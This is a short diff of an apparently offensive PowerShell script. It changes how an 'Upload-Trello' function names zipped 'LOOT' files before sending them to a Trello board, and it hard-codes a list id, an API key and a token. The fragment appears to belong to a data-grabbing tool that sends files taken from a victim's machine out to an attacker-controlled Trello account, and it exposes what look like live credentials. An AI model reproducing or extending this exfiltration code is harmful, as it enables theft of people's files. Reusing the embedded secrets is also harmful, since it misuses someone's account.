@@ -98,7 +98,7 @@ ZipFiles
 function Upload-Trello{
     
 # Replace the following values with your own
-$name = "${username}_LOOT_${dateSansHeure}"
+$name = "LOOT"
 $idList = "65c269cf32172bbc68af098b"
 $key = "e790f6a8afdd977c1ee4ccc549594c51"
 $token = "ATTA5d320a9d9329170b731f2c4a458ff9feb7777bd447bfaf0479a4646e26c8239b83D4CC8D"
